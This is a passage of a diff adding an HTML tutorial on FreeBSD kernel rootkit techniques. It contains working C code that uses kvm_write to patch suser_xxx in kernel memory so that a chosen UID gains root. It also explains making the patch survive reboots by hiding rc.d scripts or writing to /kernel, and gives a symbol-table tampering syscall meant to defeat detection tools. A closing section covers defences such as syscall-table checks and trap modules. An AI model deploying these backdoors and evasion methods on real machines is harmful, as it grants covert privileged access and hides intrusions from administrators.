+        fprintf(stderr,"Symbol %s not found.\n",nl[0].n_name);
+        exit(-1);
+    }
+
+    if(!nl[1].n_value) {
+        fprintf(stderr,"Symbol %s not found.\n",nl[1].n_name);
+        exit(-1);
+    }
+
+    printf("%s is 0x%x at 0x%x\n",nl[0].n_name,nl[0].n_type,nl[0].n_value);     
+    printf("%s is 0x%x at 0x%x\n",nl[1].n_name,nl[1].n_type,nl[1].n_value);     
+
+    /* set the address to jump to */
+    *(unsigned long *)&code[1] = nl[1].n_value;
+
+    if(kvm_write(kd,nl[0].n_value,code,sizeof(code)) < 0) {
+        fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
+        exit(-1);
+    }
+
+    printf("Written the jump\n");
+
+    if(kvm_close(kd) < 0) {
+        fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
+        exit(-1);
+    }
+
+    exit(0);
+}
+</pre>
+
+Data can be written to other places accordingly. 
+
+<h4><a name="Patching-Replace"></a>4.3. Replacing Kernel Code</h4>
+
+Although you could avoid altering existing tables using the jump method, you still
+had to load your own code. Sometimes it might be nicer to just patch your code
+into the existing function. This is not always easy though and makes your patch
+highly version and compiler dependent. Nevertheless it's kind of fun :)
+<p>
+In order to verify that someone is root, or the superuser, most self-respecting
+kernel functions call suser, which in return calls suser_xxx. This will check if 
+the user is root, and then allow it certain priviledges, such as opening raw
+sockets etc. Altering this function will provide an example to illustrate
+modifying existing code. 
+
+Let's look at the existing code on my 4.3R machine. First of all, find out
+where this function is located. For this you can use nm /kernel | grep suser_xxx
+or also tools/findsym suser_xxx. On my laptop this is at 0xc019d538. On your
+machine it will most likely be somewhere else. So now for the existing kernel
+code at that address: 
+<pre>
+# objdump -d /kernel --start-address=0xc019d538 | more
+
+/kernel:     file format elf32-i386
+
+Disassembly of section .text:
+
+c019d538 <suser_xxx>:
+c019d538:       55                      push   %ebp
+c019d539:       89 e5                   mov    %esp,%ebp
+c019d53b:       8b 45 08                mov    0x8(%ebp),%eax
+c019d53e:       8b 55 0c                mov    0xc(%ebp),%edx
+c019d541:       85 c0                   test   %eax,%eax
+c019d543:       75 20                   jne    c019d565 <suser_xxx+0x2d>
+c019d545:       85 d2                   test   %edx,%edx
+c019d547:       75 13                   jne    c019d55c <suser_xxx+0x24>
+c019d549:       68 90 df 36 c0          push   $0xc036df90
+c019d54e:       e8 5d db 00 00          call   c01ab0b0 <printf>
+c019d553:       b8 01 00 00 00          mov    $0x1,%eax
+c019d558:       eb 32                   jmp    c019d58c <suser_xxx+0x54>
+c019d55a:       89 f6                   mov    %esi,%esi
+c019d55c:       85 c0                   test   %eax,%eax
+c019d55e:       75 05                   jne    c019d565 <suser_xxx+0x2d>
+c019d560:       8b 42 10                mov    0x10(%edx),%eax
+c019d563:       8b 00                   mov    (%eax),%eax
+c019d565:       83 78 04 00             cmpl   $0x0,0x4(%eax)
+c019d569:       75 e8                   jne    c019d553 <suser_xxx+0x1b>
+c019d56b:       85 d2                   test   %edx,%edx
+c019d56d:       74 1b                   je     c019d58a <suser_xxx+0x52>
+c019d56f:       83 ba 60 01 00 00 00    cmpl   $0x0,0x160(%edx)
+c019d576:       74 07                   je     c019d57f <suser_xxx+0x47>
+c019d578:       8b 45 10                mov    0x10(%ebp),%eax
+c019d57b:       a8 01                   test   $0x1,%al
+c019d57d:       74 d4                   je     c019d553 <suser_xxx+0x1b>
+c019d57f:       85 d2                   test   %edx,%edx
+c019d581:       74 07                   je     c019d58a <suser_xxx+0x52>
+c019d583:       80 8a 72 01 00 00 02    orb    $0x2,0x172(%edx)
+c019d58a:       31 c0                   xor    %eax,%eax
+c019d58c:       c9                      leave  
+c019d58d:       c3                      ret    
+c019d58e:       89 f6                   mov    %esi,%esi
+</pre>
+
+This is what suser_xxx has been compiled to. You can compare this with the original code for suser_xxx, which is
+defined in /sys/kern/kern_prot.c:
+
+<pre>
+int
+suser_xxx(cred, proc, flag)
+        struct ucred *cred;
+        struct proc *proc;
+        int flag;
+{
+        if (!cred && !proc) {
+                printf("suser_xxx(): THINK!\n");
+                return (EPERM);
+        }
+        if (!cred)
+                cred = proc->p_ucred;
+        if (cred->cr_uid != 0)
+                return (EPERM);
+        if (proc && proc->p_prison && !(flag & PRISON_ROOT))
+                return (EPERM);
+        if (proc) 
+                proc->p_acflag |= ASU;
+        return (0);
+}
+</pre>
+
+Unless you're the total assembler person (unlike me :) ), you have to look at this for a bit. 
+You can infer that %eax contains the cred and %edx the proc stuff. Basically what we would 
+want now is something like this:
+
+<pre>
+        if ((cred->cr_uid != 0) || (cred->cr_uid != MAGIC_UID)) 
+                return (EPERM);
+</pre>
+
+Now we just have to find some place to add this code. What comes to mind is to use the
+space that is used up by the printf. It seems this will only be called if someone made an
+error using suser_xxx in the kernel. Let's just assume no one will miss a THINK! on his/her
+screen. Looking at the assembler code one can see that the compiler made all the places
+where a EPERM should be returned jump to c019d553:  mov    $0x1,%eax. Also the 
+test for uid 0 above is located at:
+<pre>
+c019d565:       83 78 04 00             cmpl   $0x0,0x4(%eax)
+c019d569:       75 e8                   jne    c019d553 <suser_xxx+0x1b>
+</pre>
+
+Lets first change this to jump to go to the place where we'll add our new code.  This is where
+the start of the printf stuff is located:
+<pre>
+c019d549:       68 90 df 36 c0          push   $0xc036df90
+c019d54e:       e8 5d db 00 00          call   c01ab0b0 <printf>
+</pre>
+
+For this we need to change the address the jump will go to. 0x75 specified
+jne and 0xe8 above is the jump address. 
+<p>
+For this to do anything useful however, we now get rid of the printf
+and replace it with another check, this time if we're the magic user.
+For this, first add a jump to jump over this extra test in case the 
+test if (!cred && !proc) right at the beginning will actually lead
+normal execution to the printf statement. After this the extra
+test can be added. Basically this means one'd want to put something like
+<pre>
+jmp 0x07                        eb 07                /* jump over this */
+cmpl $magic,0x4(%eax)         83 78 04 magic       /* check if magic user */
+je 0x39                         74 39                /* jump to end if equal */
+nop                           90                   /* nops to fill up the space */
+nop                           90
+</pre>
+in place of the printf. This means the jmp after if (cred->cr_uid != 0) at
+0xc019d569 would have to be changed to 75 e0. (jump back 8 bytes more).
+At the end two nops are added since the original printf push/call took 
+more space.
+<p>
+Ok, now let's put this all together. This will add the extra check for user
+with uid 100 (me on my laptop :) ) as described above:
+
+<pre>
+#include <stdio.h>
+#include <fcntl.h>
+#include <kvm.h>
+#include <nlist.h>
+#include <limits.h>
+
+#define MAGIC_ADDR      0xc019d549
+#define MAKE_OR_ADDR    0xc019d569
+
+unsigned char magic[] = "\xeb\x07"      /* jmp 06 */
+                        "\x83\x78\x04\x00"      /* cmpl $magic,0x4(%eax) */
+                        "\x74\x39"      /* je to end */
+                        "\x90\x90"      /* filling nop */
+;
+
+
+unsigned char makeor[] = "\x75\xe0";    /* jne e0 */
+
+int
+main(int argc, char **argv) {
+
+        char errbuf[_POSIX2_LINE_MAX];
+        long diff; 
+        kvm_t *kd;
+        u_int32_t magic_addr = MAGIC_ADDR;
+        u_int32_t makeor_addr = MAKE_OR_ADDR;
+
+        kd = kvm_openfiles(NULL,NULL,NULL,O_RDWR,errbuf);
+        if(kd == NULL) {
+                fprintf(stderr,"ERROR: %s\n",errbuf);
+                exit(-1);
+        }
+
+
+        if(kvm_write(kd,MAGIC_ADDR,magic,sizeof(magic)-1) < 0) {
+                fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
+                exit(-1);
+        }
+
+        if(kvm_write(kd,MAKE_OR_ADDR,makeor,sizeof(makeor)-1) < 0) {
+                fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
+                exit(-1);
+        }
+
+        if(kvm_close(kd) < 0) {
+                fprintf(stderr,"ERROR: %s\n",kvm_geterr(kd));
+                exit(-1);
+        }
+
+        exit(0);
+}
+</pre>
+
+In direct/fix_suser_xxx.c you will find a slightly altered version, which will
+ask you for your user id (< 256 ;)) and find out the location of fix_suser_xxx
+itself. 
+<p>
+After you made these changes you can quickly test it, with your new superuser by copying
+/sbin/ping to your own directory and executing it as the user.
+
+<h3><a name="Reboot"></a>5. Reboot Proofing</h3>
+
+In the case of the module, you can use file redirection to make your module reboot
+proof. You could for example have the startup stuff for your module in a file
+in /usr/local/etc/rc.d/ where it will be executed on startup (before the secure level is
+raised) and then hide that file after you're loaded. 
+<p>
+If you've been changing kernel code directly in memory, you can write your changes
+directly to /kernel. I did not check this with the elf docs, but it seems that
+the relocation addresses are equal to the offset in /kernel plus 0xc0100000.
+You might want to check this on your machine before writing to /kernel.
+There's an example for this, which also modifies suser_xxx in direct/fix_suser_xxx_kernel.c
+
+<h3><a name="Experimental"></a>6. Experimental</h3>
+
+In some of the examples above, the address of a symbol is retrieved from /dev/kmem,
+but where does this actually come from ? This data is also kept in the kernel, and
+is thus also subject to alteration. The symbols are in an elf hash table. Every linked
+file comes with its own symbols. The example in exp/symtable.c looks at the
+first entry in the linker_files list, namely the original kernel. The symbol
+name is hashed and then retrieved. Once it's found, the new address can be set.
+<p>
+This is an excerpt from exp/symtable.c:
+<pre>
+int
+set_symbol(struct proc *p, struct set_symbol_args *uap)
+{
+
+    linker_file_t lf;
+    elf_file_t ef;
+    unsigned long symnum;
+    const Elf_Sym* symp = NULL;
+    Elf_Sym new_symp;
+    const char *strp;
+    unsigned long hash;
+    caddr_t address;
+    int error = 0;
+
+    mod_debug("Set symbol %s address 0x%x\n",uap->name,uap->address);
+
+    lf = TAILQ_FIRST(&linker_files);
+    ef = lf->priv;
+
+    /* First, search hashed global symbols */
+    hash = elf_hash(uap->name);
+    symnum = ef->buckets[hash % ef->nbuckets];
+
+    while (symnum != STN_UNDEF) {
+        if (symnum >= ef->nchains) {
+            printf("link_elf_lookup_symbol: corrupt symbol table\n");
+            return ENOENT;
+        }
+
+        symp = ef->symtab + symnum;
+        if (symp->st_name == 0) {
+            printf("link_elf_lookup_symbol: corrupt symbol table\n");
+            return ENOENT;
+        }
+
+        strp = ef->strtab + symp->st_name;
+
+        if (!strcmp(uap->name, strp)) {
+
+            /* found the symbol with the given name */
+            if (symp->st_shndx != SHN_UNDEF ||
+                (symp->st_value != 0 && ELF_ST_TYPE(symp->st_info) == STT_FUNC)) {
+
+                /* give some debug info */
+                address = (caddr_t) ef->address + symp->st_value;
+                mod_debug("found %s at 0x%x!\n",uap->name,(uintptr_t)address);
+
+                bcopy(symp,&new_symp,sizeof(Elf_Sym));
+                new_symp.st_value = uap->address;
+
+                address = (caddr_t) ef->address + new_symp.st_value;
+                mod_debug("new address is 0x%x\n",(uintptr_t)address);
+
+                /* set the address */
+                bcopy(&new_symp,(ef->symtab + symnum),sizeof(Elf_Sym)); 
+
+                break;
+
+                break;
+
+            } else
+                return(ENOENT);
+        }
+
+        symnum = ef->chains[symnum];
+    }    
+
+    /* for now this only looks at the global symbol table */
+
+    return(error);
+}
+</pre>
+
+The symtable module is a seperate module which will load the system call above. You can
+test it using the set_sym utility. This defeats the checks made by tools/checkcall. 
+<p>
+This table is also consulted when new stuff is linked into the kernel, so you might
+want to play with this :) Unfortunately I didn't get around to it yet.
+
+<h3><a name="Defense"></a>7. Defending yourself: The cat and mouse game</h3>
+
+Now you might ask yourself, what you can do in order to prevent these things
+from happening to your system. Or perhaps you're also just interested in 
+finding yourself again :) 
+<p>
+Let's look at some of the methods that could be used to detect such a module. 
+
+<h3><a name="Defense-Symbol"></a>7.1. Checking the symbol table</h3>
+
+In many of the examples above, the symbol table has been altered. So you can 
+check the symbol table for modifications. One way to do this is to load 
+a module at startup that will make a copy of the syscall table as it is then.
+You can have it include a syscall which will allow you to compare the current
+syscall table with the saved copy later on.
+<p>
+This approach probably works in many cases. However when other tables are 
+altered it won't detect the modifications. Of course you could go and check
+more tables in your module in exactly the same way. Furthermore this approach will not 
+detect modifications that have been made by inserting jumps to other functions or 
+completely different code into the running kernel.
+<p>
+You could also check the syscall table via /dev/kmem. There's a small example
+in tools/checkcall which will take the name of a syscall and it's syscall index
+and check if this entry in the syscall table really points to this function. 
+<p>
+The problem with this approach however is that the symbol table in memory can
+be altered as shown in the experimental section above. This means that when checkcall
+find out where a certain function should actually be, it could retrieve the wrong value.
+Perhaps a small example will clarify this: assume we've loaded standard CY. Let's say
+we want to check the open syscall. The number of SYS_open from /sys/sys/syscall.h is 5.
+So let's call tools/checkcall open 5:
+<pre>
+# tools/checkcall open 5
+Checking syscall 5: open
+
+sysent is 0x4 at 0xc03b7308
+sysent[5] is at 0xc03b7330 and will go to function at 0xc0cd5bf4
+ALERT! It should go to 0xc01ce5f8 instead
+</pre>
+
+However, we can fix this using setsym. For this you first need to load the module
+contained in the experimental section exp/. 
+<pre>
+# exp/setsym 0xc0cd5bf4 open
+</pre>
+
+Now checkcall will no longer complain, as it assumes open is really at 0xc0cd5bf4.
+Again however this is not the end of the story. We could now check /kernel whats
+actually there at address 0xc0cd5bf4 using objdump -d /kernel --start-address=0xc0cd5bf4.
+The suspicion that this address is way to high for a function that was loaded together
+with the original kernel is confirmed. objdump will find nothing at the address. This
+is another indication that something fishy is going on.
+<p>
+The problem with this approach is that someone could use file redirection to point
+you to a different /kernel or objdump. However it would be quite a bit of hassle
+to cover this up. 
+
+<h3><a name="Defense-Trap"></a>7.2. Building a Trap Module</h3>
+
+Another thing you can do is to enter a trap module which will catch calls
+made to kldload. You can then log the fact that a module has been loaded or
+simply deny any further loading. There's a small example in trapmod/. 
+Ideally you load this module in stealth mode, when your system is started
+and before you raise the secure level. 
+<p>
+Note however that the defensive methods outlined in 7.1. can also be used
+against your trapmodule :)
+ 
+<h3><a name="Defense-Direct"></a>7.3. Retrieving data directly</h3>
+
+Recall that many of the hiding functions above just altered the functions
+you can use to get a view of the system. One way to defend yourself against
+this, is to provide your own access to this data. This can be done either
+by loading your own kernel module or by reading the data from /dev/kmem.
+<p>
+If you load your own kernel module you can supply a system call that will
+give you access to the kernel data and structures you want. Alternatively
+you can also just provide a second copy of some of the existing stuff that
+can be replaced, although that's a bit of a hassle.
+<p>
+The problem with this approach is however that an attacker that knows
+of your modules, can circumvent them.  
+<p>
+You can also retrieve the data directly from /dev/kmem. Above I already
+described how to retrieve data from kernel memory and also how to get
+access to whole structures. tools/listprocs.c contains an example of 
+how to get a list of the currently running processes. You can retrieve
+other structures in the same way. It would probably be possible to filter 
+reads from /dev/kmem to obscure this information. However this would
+require some more effort. 
+
+<h3><a name="Defense-Remarks"></a>7.4. Remarks</h3>
+
+As you can see defending yourself turns into a kind of cat and mouse game.
+If you know what the attacker is doing, you can devise a way to defend
+yourself and detect the module. In return a knowledgeable attacker can most likely 
+circumvent your defenses, if he/she finds out they are there and how they work. Of course
+you can then try and work around that as well...
+This can basically go on almost forever, until you've both wasted your life
+creating more and more obscure kernels :) 
+
+
+<h3><a name="Conclusion"></a>8. Conclusion</h3>
+
+Many of the techniques used to attack a system can be used for defense as well.
+Also employing such modules to hide administrative tools can be useful. For a 
+sysadmin, it would be possible to hide a shell and the files 
+that are used to monitor an intruder on the system.
+<p>
+Hopefully this article made it clear that all these kinds of manipulations are
+not that difficult or rare as some people seem to think. If you're the sysadmin
+of a box, you should always keep the possibility of these things in your head
+even if you run your FreeBSD system with a higher secure level (which you 
+always should). 
+<p>
+Playing with this kind of stuff allows you to learn more about how the kernel works. 
+And, most importantly, it can be fun :) 
+
+<h3><a name="Code"></a>9. Code</h3>
+
+All code for this article and some more tools and examples is collected in a package
+called <a href="cyellow-0.01.tar.gz">Curious Yellow</a> See the README for a roadmap.
+
+<h3><a name="References"></a>10. References</h3>
+
+<h4>FreeBSD</h4>
+    <ul>
+        <li><a href="http://www.securiteam.com/unixfocus/5WP031535U.html">Exploiting Kernel buffer overflows FreeBSD Style</a> by Esa Etelavuori
+
+        <li><a href="http://packetstormsecurity.org/papers/unix/bsdkern.htm">Attacking FreeBSD with Kernel Modules - The System Call Approach</a> by pragmatic/THC
+
+        <li><a href="http://www.daemonnews.org/200010/blueprints.html">Dynamic Kernel Linker (KLD) Facility Programming Tutorial</a> by Andrew Reiter
+    </ul>
+
+<h4>Linux</h4>
+    <ul>
+        <li><a href="http://www.big.net.au/~silvio/runtime-kernel-kmem-patching.txt">Runtime Kernel Kmem Patching</a> by Silvio Cesare
+    </ul>
+
+<h4>Inspiriation :)</h4>
+     <ul>
+	<li>Jeff Noon, "The Vurt"
+     </ul>
+
+<h3><a name="Thanks"></a>11. Thanks</h3>
+
+Thanks go to:
+<pre>
+Job de Haas        for getting me interested in this whole stuff
+Olaf Erb           for checking the article for readability :)
+
+and especially Alex Le Heux
+</pre>
+
+
+
+</body>
+    
